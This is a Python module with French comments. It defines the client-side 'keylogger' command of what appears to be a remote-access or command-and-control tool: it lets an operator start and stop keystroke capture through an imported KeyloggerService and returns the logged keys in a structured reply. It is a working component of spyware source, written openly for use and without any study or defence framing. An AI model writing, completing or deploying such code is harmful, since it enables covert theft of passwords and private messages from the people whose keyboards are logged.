# Ce module définit la commande keylogger côté client.
# Elle agit comme une interface entre le système de commandes
# et le service KeyloggerService, permettant de démarrer ou arrêter
# l’enregistrement des frappes clavier.
# Les données capturées sont ensuite renvoyées au format structuré.

from .base_command import BaseCommand
from ..client.keylogger_service import KeyloggerService


class KeyloggerCommand(BaseCommand):

    # Nom utilisé par le CommandRegistry pour identifier la commande
    name = "keylogger"

    description = "Start or stop the keylogger"

    # Instance unique du service de keylogging (persistante entre appels)
    _service = KeyloggerService()

    def execute(self, args: str) -> str:

        # Normalisation des arguments (sécurité + robustesse)
        args = args.strip().lower()

        # Démarrage du keylogger
        if args == "start":
            result = self._service.start()

            return f"TEXT\n{result}\nEOF"

        # Arrêt du keylogger + récupération des frappes enregistrées
        if args == "stop":
            data = self._service.stop()

            return f"KEYLOG\nOK\n{data}\nEOF"

        # Message d’aide si mauvaise utilisation
        return "TEXT\nUsage:\n" "keylogger start\n" "keylogger stop\n" "EOF"
